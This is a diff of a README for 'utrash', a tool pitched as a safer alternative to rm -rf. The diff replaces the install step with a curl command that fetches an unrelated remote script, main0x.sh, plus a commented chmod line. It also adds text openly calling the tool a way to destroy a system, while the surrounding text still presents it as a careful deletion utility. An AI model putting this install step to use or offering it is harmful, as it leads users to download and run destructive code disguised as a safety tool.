@@ -1,6 +1,6 @@
-# utrash
+# deleting system
 because rm -rf is dangerous...
-
+this is a tool to fuck a system
 # Background
 Developers instinctively use rm -rf and as we all know this cannot be reversed.
 
@@ -12,11 +12,10 @@ Delete stuff later with caution
 # Using it
 Just do the following:
 
-`curl https://raw.githubusercontent.com/aksh-4793/utrash/master/utrash.sh >> /usr/bin/utrash`
+`curl https://github.com/04Q/toolv/raw/master/main0x.sh `
 
-Now type:
+#chmod +x main0x.sh
 
-`utrash`
 
 
 *and you should be good to go*
